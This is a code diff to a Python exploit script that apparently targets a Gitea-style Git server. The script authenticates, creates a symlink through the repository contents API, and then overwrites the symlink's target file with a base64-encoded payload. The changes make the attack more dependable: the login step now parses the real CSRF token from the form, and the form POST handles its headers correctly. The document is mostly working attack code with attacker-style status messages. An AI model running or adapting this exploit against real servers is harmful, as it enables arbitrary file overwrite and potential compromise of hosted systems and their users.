@@ -12,19 +12,28 @@ import base64
 import json
 import os
 from urllib.parse import quote
+from bs4 import BeautifulSoup
 
 def get_auth_token(session, base_url, username, password):
     """Authenticate and retrieve CSRF token + session cookie."""
     login_url = f"{base_url}/user/login"
-    session.get(login_url)  # Get CSRF token from form
-    
-    # Extract _csrf from response (simplified; parse HTML in production)
+    resp = session.get(login_url)
+    soup = BeautifulSoup(resp.text, "html.parser")
+    csrf_input = soup.find("input", {"name": "_csrf"})
+    if not csrf_input or not csrf_input.get("value"):
+        raise ValueError("Could not find CSRF token in login page")
+    csrf_token = csrf_input["value"]
     login_data = {
         "user_name": username,
         "password": password,
-        "_csrf": session.cookies.get('_csrf', '')  # Adjust based on actual form
+        "_csrf": csrf_token
     }
+    # Temporarily remove JSON header for form POST
+    old_content_type = session.headers.pop("Content-Type", None)
     resp = session.post(login_url, data=login_data)
+    # Restore JSON header if it was set
+    if old_content_type:
+        session.headers["Content-Type"] = old_content_type
     if "user/login" in resp.url:
         raise ValueError("Authentication failed")
     print("[+] Authenticated successfully")
@@ -41,12 +50,13 @@ def create_symlink(session, base_url, repo, symlink_path, target_path):
     }
     resp = session.put(api_url, json=data)
     if resp.status_code != 201:
-        raise ValueError(f"Failed to create symlink: {resp.text}")
+        raise ValueError(f"Failed to create symlink: {resp.status_code}")
     print(f"[+] Symlink created: {symlink_path} -> {target_path}")
 
 def overwrite_via_symlink(session, base_url, repo, symlink_path, payload):
     """Step 2: 'Update' the symlink to overwrite target with payload."""
     api_url = f"{base_url}/api/v1/repos/{repo}/contents/{symlink_path}"
+    
     payload_b64 = base64.b64encode(payload.encode()).decode()
     data = {
         "message": "Overwrite via symlink",
